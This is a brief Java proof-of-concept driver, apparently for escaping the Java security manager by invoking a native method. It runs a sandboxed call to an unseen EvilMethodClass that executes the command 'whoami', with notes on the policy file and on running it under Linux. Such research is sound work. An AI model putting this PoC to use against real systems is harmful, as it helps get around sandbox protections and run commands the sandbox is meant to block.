package com.evil;


public class Poc {
    //Run with: -Djava.security.manager -Djava.security.policy==invoke-native-method.policy
    //这个poc需要在Linux上跑
    public static void main(String[] args){
        EvilMethodClass.evilMethod("whoami");
    }
}
